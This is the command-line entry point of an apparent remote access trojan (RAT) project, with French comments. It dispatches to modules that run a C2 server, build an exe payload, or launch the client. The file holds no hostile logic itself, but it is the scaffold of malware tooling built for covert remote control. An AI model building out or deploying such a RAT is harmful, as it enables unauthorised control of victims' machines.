# rat/__main__.py
# usage:
#   python -m rat          → lance le C2
#   python -m rat build    → génère le payload exe
#   python -m rat client   → lance le client directement (test local)
import sys

def main():
    args = sys.argv[1:]
    if not args or args[0] == "serve":
        from rat.server import run
        run()
    elif args[0] == "build":
        from rat.builder import build
        build()
    elif args[0] == "client":
        from rat.client import run
        run()
    else:
        print("usage: python -m rat [serve|build|client]")
        sys.exit(1)

main()